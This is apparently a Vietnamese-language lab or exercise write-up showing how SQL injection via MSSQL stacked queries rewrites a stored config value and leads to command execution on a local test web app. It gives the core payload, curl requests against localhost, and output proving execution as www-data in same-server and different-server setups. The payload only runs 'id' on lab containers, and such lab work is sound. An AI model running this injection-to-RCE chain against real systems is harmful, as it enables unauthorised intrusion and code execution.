# Task 4 - RCE via Stacked Query on MSSQL


- Tham so product_id duoc noi chuoi truc tiep vao cau lenh SQL tren MSSQL.
- Khi chen dau ; va cau UPDATE, ung dung van bao search completed.

- Chuoi tan cong: SQLi (MSSQL stacked query) -> doi diag_target -> trigger Maintenance -> RCE.

### 2.3 Payload cot loi
```text
1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--
```

Ly do chon id: output uid/gid xac nhan ro RCE tren he thong web.

## 3. Cac buoc khai thac toi thieu

### 3.1 Case 1 (same-server)
```bash
curl -X POST http://localhost:8051/index.php \
  -d "action=search&product_id=1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--"

curl -X POST http://localhost:8051/index.php -d "action=diag"
curl -X POST http://localhost:8051/index.php -d "action=hostcheck"
```

### 3.2 Case 2 (different-server)
```bash
curl -X POST http://localhost:8052/index.php \
  -d "action=search&product_id=1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--"

curl -X POST http://localhost:8052/index.php -d "action=diag"
curl -X POST http://localhost:8052/index.php -d "action=hostcheck"
```

## 4. Bang chung da kiem thu

### Case 1
- Search: Search completed (stacked query executed).
- Diag: Maintenance command executed on web from MSSQL-stored value: id.
- Output command: uid=33(www-data) gid=33(www-data) groups=33(www-data).
- Host check:
  - Web host: 2b65061f7b1d
  - DB host: 2b65061f7b1d
  - DB endpoint from web: 127.0.0.1 => likely SAME server.

Ket luan: Dat yeu cau same-server va co chuoi RCE via stacked query tren MSSQL.

### Case 2
- Search: Search completed (stacked query executed).
- Diag: Maintenance command executed on web from MSSQL-stored value: id.
- Output command: uid=33(www-data) gid=33(www-data) groups=33(www-data).
- Host check:
  - Web host: 9f4cdf51ff68
  - DB host: fcf3ece0171f
  - DB endpoint from web: task4-case2-mssql => likely DIFFERENT server.

Ket luan: Dat yeu cau different-server va co chuoi RCE via stacked query tren MSSQL.

